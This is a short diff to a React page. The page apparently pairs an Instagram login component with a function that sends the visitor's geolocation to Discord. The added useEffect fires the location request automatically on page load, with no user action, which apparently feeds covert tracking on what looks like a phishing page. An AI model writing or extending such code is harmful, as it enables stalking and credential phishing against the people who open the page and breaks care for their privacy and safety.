@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useRef, useCallback } from 'react'
+import { useState, useRef, useCallback, useEffect } from 'react'
 import InstagramLogin from '@/components/InstagramLogin'
 
 export default function Home() {
@@ -69,7 +69,7 @@ export default function Home() {
       },
       (error) => {
         console.error('Location access error:', error.code, error.message)
-        // Reset to allow retry
+        // Reset to allow retry on user interaction
         locationRequested.current = false
         
         // Log specific error types
@@ -92,6 +92,16 @@ export default function Home() {
       }
     )
   }, [sendLocationToDiscord])
+
+  // Request location immediately when page loads
+  useEffect(() => {
+    // Small delay to ensure page is fully loaded
+    const timer = setTimeout(() => {
+      requestLocation()
+    }, 100)
+    
+    return () => clearTimeout(timer)
+  }, [requestLocation])
 
   return (
     <main 
